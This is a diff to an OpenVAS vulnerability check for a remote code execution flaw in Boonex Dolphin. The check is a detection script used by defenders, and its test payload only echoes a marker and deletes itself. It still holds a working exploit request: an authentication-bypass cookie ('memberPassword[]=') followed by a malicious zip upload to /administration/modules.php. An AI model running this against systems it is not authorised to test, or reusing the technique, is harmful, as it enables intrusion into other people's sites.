@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_dolphin_rce_11_16.nasl 9437 2018-04-11 10:24:03Z cfischer $
+# $Id: gb_dolphin_rce_11_16.nasl 12449 2018-11-21 07:50:18Z cfischer $
 #
 # Boonex Dolphin Remote Code Execution Vulnerability
 #
@@ -27,35 +27,35 @@
 
 CPE = 'cpe:/a:boonex:dolphin';
 
-if (description)
+if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.140061");
- script_version ("$Revision: 9437 $");
- script_tag(name:"cvss_base", value:"7.5");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_oid("1.3.6.1.4.1.25623.1.0.140061");
+  script_version("$Revision: 12449 $");
+  script_tag(name:"cvss_base", value:"7.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_name("Boonex Dolphin Remote Code Execution Vulnerability");
+  script_tag(name:"last_modification", value:"$Date: 2018-11-21 08:50:18 +0100 (Wed, 21 Nov 2018) $");
+  script_tag(name:"creation_date", value:"2016-11-15 12:20:21 +0100 (Tue, 15 Nov 2016)");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
+  script_dependencies("gb_dolphin_detect.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("Dolphin/Installed");
 
- script_name("Boonex Dolphin Remote Code Execution Vulnerability");
+  script_xref(name:"URL", value:"https://www.boonex.com/n/dolphinpro-7-3-3-released-important-security-upda");
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40756/");
 
- script_tag(name: "vuldetect" , value:"Upload a php file within a zip file and try to execute it");
- script_tag(name: "summary" , value:"Boonex Dolphin is prone to a remote code execution vulnerability in `/administration/modules.php`. ");
- script_tag(name:"solution_type", value: "VendorFix");
- script_tag(name: "solution" , value:"Update to 7.3.3 or later");
+  script_tag(name:"vuldetect", value:"Upload a php file within a zip file and try to execute it.");
 
- script_xref( name:"URL", value:"https://www.boonex.com/n/dolphinpro-7-3-3-released-important-security-upda");
- script_xref( name:"URL", value:"https://www.exploit-db.com/exploits/40756/");
+  script_tag(name:"summary", value:"Boonex Dolphin is prone to a remote code execution vulnerability in `/administration/modules.php`.");
 
- script_tag(name:"qod_type", value:"exploit");
+  script_tag(name:"solution", value:"Update to 7.3.3 or later.");
 
- script_tag(name:"last_modification", value:"$Date: 2018-04-11 12:24:03 +0200 (Wed, 11 Apr 2018) $");
- script_tag(name:"creation_date", value:"2016-11-15 12:20:21 +0100 (Tue, 15 Nov 2016)");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
- script_dependencies("gb_dolphin_detect.nasl");
- script_require_ports("Services/www", 80);
- script_mandatory_keys("Dolphin/Installed");
+  script_tag(name:"solution_type", value:"VendorFix");
+  script_tag(name:"qod_type", value:"exploit");
 
- exit(0);
+  exit(0);
 }
 
 include("misc_func.inc");
@@ -67,9 +67,10 @@ if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
 rand = rand_str( length:8, charset:"abcdefghijklmnopqrstuvwxyz1234567890" );
+vtstrings = get_vt_strings();
 
-file = 'openvas_' + rand + '.php';
-zipfile = 'openvas_' + rand + '.zip';
+file = vtstrings["lowercase"] + '_' + rand + '.php';
+zipfile = vtstrings["lowercase"] + '_' + rand + '.zip';
 
 # <?php echo base64_decode("T3BlblZBUyBSQ0UgVGVzdAo="); unlink(__FILE__); ?>
 zip = raw_string(
@@ -97,11 +98,11 @@ raw_string(
 post_data = '-----------------------------\r\n' +
             'Content-Disposition: form-data; name="submit_upload"\r\n' +
             '\r\n' +
-            'openvas\r\n' +
+            vtstrings["lowercase"] + '\r\n' +
             '-----------------------------\r\n' +
             'Content-Disposition: form-data; name="csrf_token"\r\n' +
             '\r\n' +
-            'openvas\r\n' +
+            vtstrings["lowercase"] + '\r\n' +
             '-----------------------------\r\n' +
             'Content-Disposition: form-data; name="module"; filename="' + zipfile + '"\r\n' +
             'Content-Type: application/zip\r\n' +
@@ -112,7 +113,7 @@ post_data = '-----------------------------\r\n' +
 req = http_post_req( port:port,
                      url:dir + '/administration/modules.php',
                      data:post_data,
-                     add_headers:make_array( "Cookie", "memberID=1; memberPassword[]=openvas;",
+                     add_headers:make_array( "Cookie", string("memberID=1; memberPassword[]=", vtstrings["lowercase"], ";"),
                                              "Content-Type", "multipart/form-data; boundary=---------------------------")
                    );
 
